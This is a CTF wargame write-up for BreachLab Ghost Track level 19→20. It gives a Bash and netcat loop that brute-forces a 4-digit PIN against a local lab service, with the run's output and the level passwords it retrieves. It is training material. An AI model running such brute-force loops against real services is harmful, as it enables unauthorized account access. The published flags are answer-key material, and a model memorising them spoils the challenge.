# BreachLab - Ghost Track: Level 19 → 20 (Your First Script / PIN Brute Force)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Ghost Track
- **Level:** Level 19 → 20 (Your First Script)
- **Host:** `204.168.229.209`
- **Port:** `2222`
- **Current User:** `ghost19`
- **Goal:** Retrieve the password / credentials for `ghost20`
- **Next Connection:** `ssh ghost20@204.168.229.209 -p 2222`

---

## 1. Scenario & Objectives

The MOTD banner for Level 19 introduces automated brute forcing:
> *"A service wants a password and a 4-digit PIN. Ten thousand possibilities. Stop typing them by hand — write code that types them for you."*

A local TCP listener running on port `30002` requires the current level password followed by a 4-digit numeric PIN (`0000` to `9999`). The objective is to write a Bash scripting loop that iterates through all potential 4-digit PIN combinations against `localhost:30002` until discovering the valid PIN and extracting the password for `ghost20`.

---

## 2. Reconnaissance & Target Exploration

Logging in via SSH as `ghost19` and checking local artifacts:

```bash
ghost19@breachlab:~$ ls -la
total 56
drwx------ 1 ghost19 ghost19 4096 Jun  2 04:10 .
drwxr-xr-x 1 root    root    4096 May 19 12:05 ..
...
-r-------- 1 ghost19 ghost19   10 May 19 12:05 flag
```

### Reading Local Current Flag

```bash
ghost19@breachlab:~$ cat flag
SU1D_Fl1p
```

Connecting to port `30002` reveals the service input format: `<password> <4-digit PIN>`.

---

## 3. Automated Brute-Force Scripting

Because the service terminates connections upon receiving an invalid entry, piping all combinations into a single connection closes early. Instead, a Bash loop initiates individual connections per PIN attempt:

```bash
PASS=$(cat flag)
for pin in {0000..9999}; do
    echo -ne "Testing PIN: $pin\r"
    res=$(echo "$PASS $pin" | nc -w 1 localhost 30002)
    if [[ "$res" != *"Wrong"* ]]; then
        echo -e "\n\n[+] Correct PIN found ($pin)! Server response:\n$res"
        break
    fi
done
```

### Execution Output

```bash
ghost19@breachlab:~$ PASS=$(cat flag); for pin in {0000..9999}; do echo -ne "Probando PIN: $pin\r"; res=$(echo "$PASS $pin" | nc -w 1 localhost 30002); if [[ "$res" != *"Wrong"* ]]; then echo -e "\n\n[+] ¡BINGO! Respuesta del servidor:\n$res"; break; fi; done
Probando PIN: 7349

[+] ¡BINGO! Respuesta del servidor:
Correct! Next password: P1N_Cr4ck3d
```

The valid PIN identified was `7349`.

---

## 4. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Next User** | `ghost20` |
| **Password / Flag** | `P1N_Cr4ck3d` |
| **Target Service** | `localhost:30002` |
| **Valid PIN** | `7349` |
| **Target SSH Command** | `ssh ghost20@204.168.229.209 -p 2222` |

---

## 5. Key Commands & Concepts Reference

- `{0000..9999}`: Bash brace expansion generating padded four-digit sequences from 0 to 9999.
- `nc -w <seconds> <host> <port>`: Set network connection timeout to prevent hanging on unresponsive sockets.
- `echo -ne "...\r"`: Overwrite terminal line in-place for lightweight progress reporting.

---

## 6. Lessons Learned

1. **Protocol-Aware Brute Forcing:** Distinguish between streaming batch input services and per-connection interactive services when crafting automated brute force loops.
2. **Bash Automation for CTFs:** Quick one-liner loops utilizing brace expansion and Netcat eliminate the need for full external scripting languages like Python for simple network service enumeration.
